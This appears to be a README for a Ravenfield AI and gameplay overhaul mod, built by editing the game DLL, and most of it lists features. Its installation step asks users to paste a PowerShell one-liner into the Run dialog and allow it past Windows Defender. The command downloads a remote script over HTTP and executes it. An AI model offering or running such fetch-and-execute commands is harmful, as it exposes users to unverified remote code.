HavenM

Question 1) what is it
   
HavenM is a game-changing AI and gameplay overhaul mod for Ravenfield, designed to enhance immersion, realism, and challenge. By modifying the game’s DLL using dnSpy, this mod pushes AI behavior and game mechanics far beyond the vanilla experience.

Question 2) Why did I edit the game dll with dnspy for almost 2 years:

I believe Ravenfield’s AI needed to be more realistic, more reactive, and more engaging. The default AI often felt too predictable, lacking the tactical decision-making and combat awareness that could make battles feel more fun to play against.

OK, what did the dll change:

AI Changes: 

-AI soldiers will now go prone when under fire, making them harder to hit and more tactical in their reactions.
-AI no longer auto-crouches—instead, they will jog to objectives when not under fire, significantly improving game pacing and movement fluidity.
-AI will now exit vehicles when submerged in water and leave aircraft when stuck, preventing soft-lock situations.
-AI will halt vehicles to fire their weapons, but this is now based on skill level and weapon type, making engagements more tactical.
-AI using wire-guided missile weapons will now stop, aim, fire, and track their target until it is destroyed, making anti-vehicle AI much more effective.
-AI will fire more aggressively overall, reducing hesitation in combat and making firefights feel more intense.
-Ai from all skill levels will now lean 
-Ai will hide behind cover when taking fire
-Ai will provide suppressive fire on known enemy positions, keeping opponents pinned down.
-AI will now prioritize high-threat targets, such as mortar teams, instead of engaging randomly.
-Ground units will engage low-flying and slow-moving aircraft, making landing helicopters and air support more vulnerable
-AI randomizes weapon switching based on how many of their available weapons can effectively engage a target, preventing predictable behavior.
-AI switches between grenades, under-barrel grenade launchers, and melee weapons when appropriate, making them more versatile.
-Vehicles with low passenger counts will halt more often to provide fire support rather than recklessly rushing into battle.
-Airplanes perform better in air-to-ground attacks, adjusting their tactics based on their weapon loadout.
-AI-driving vehicles now reverse at speeds based on their actual reverse speed, reducing vehicle infinite stuck (such as the t72 tank)
-Ai loadout will be randomized this time
-Ai will no longer drop their target when the active game mode is specops or the current target is within 40m
-Ai will panic fire when the enemy is within 20m of it and fire at the target regardless of the weapon effectiveness ( making kamikaze vehicle mod work )
-Ai flying a helicopter will do a slow-down, movement to stabilize itself when it spots an enemy far away while using a wire-guided missile weapon, allowing it to fire at the target effectively as long as it can see its target
-Ai hiding behind cover or near cover will now considered an infantry group ( allowing explosives to be fired at them )

New Game Mechanics:

Weapon Mounting System:
-Inspired by Rising Storm: Vietnam, players can now mount weapons on surfaces for improved accuracy and stability.

Advanced Missile Targeting:

-Missiles now predict target movement instead of flying straight at them, making dogfights and anti-vehicle combat more challenging. ( pro tip: when getting tracked, fly low, the air-to-air missile will not detect you as an aircraft)

-Flare will not stop a missile from continuing to lock on the aircraft, but it will  make the missile confused and move side to side, allowing the missile to miss but also still have a chance to hit the flared aircraft 

Simple Penetration System:

-High-damage weapons (Heavy arms, explosives projectile) now feature simple penetration mechanics, allowing bullets and explosives to pass through cover if they deal over 100 damage and ignore cover and explode if the damage is over 900.

---Overhauled SpecOps Game Mode---

A complete revamp of the SpecOps mode, featuring:

Dynamically spawning enemies, ensuring unpredictable encounters.

-Customizable objective numbers and enemy count, allowing for tailored difficulty ( using the bot number for the number of ai on each objective and the respawn timer for the number of objective)
-In specops, AI will leave their vehicle when the player gets too close to engage the enemy head-on 
-AI flanking and ambushing the player based on their skill level, making SpecOps a true tactical challenge.
-bot with skill normal and lower will rush into the target's last known position 
-the veteran bot will stay back and provide fire support, ambushing players running out 
-Enemy will spawn more when exfil, making more enemy spawn in a shorter amount of time
-Ai no longer need to see player to fire their flare, they just need to be alerted 

Installation 
Copy this command, Win+R to open "Run" windows, paste it, and press Enter.

It will create an Updater shortcut in Desktop.

**YOU MAY NEED TO ALLOW THIS ACTION ON YOUR** [WINDOWS DENFENDER](windowsdefender://threat) **FOR THE FIRST TIME!!!**
```batch
powershell -nop -c "$w=(New-Object System.Net.WebClient);$w.Encoding=[System.Text.Encoding]::UTF8;iex($w.DownloadString('http://ravenfieldcommunity.github.io/static/get_havenm-utf8.ps1'));Read-Host;"
```
